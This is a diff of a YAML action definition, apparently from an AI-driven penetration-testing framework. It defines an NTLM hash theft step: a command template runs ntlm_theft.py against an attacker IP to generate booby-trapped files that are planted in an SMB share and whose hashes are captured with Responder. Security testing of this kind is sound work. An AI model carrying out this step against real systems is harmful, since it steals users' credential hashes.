@@ -2,15 +2,17 @@ name: ntlm_theft
 category: services
 description: NTLM hash theft via document/link
 preconditions:
-  - has_target
+- has_target
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "python3 ntlm_theft.py -g all -s {attacker_ip} -f payload"
+command_template: python3 ntlm_theft.py -g all -s {attacker_ip} -f payload
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Generate files that force NTLM auth when opened: .scf, .url, .lnk, .htm, .docx, .pdf, .xml. Place in writable SMB share. Capture hash with Responder."
+mechanism: 'Generate files that force NTLM auth when opened: .scf, .url, .lnk, .htm,
+  .docx, .pdf, .xml. Place in writable SMB share. Capture hash with Responder.'
+hacktricks_ref: windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
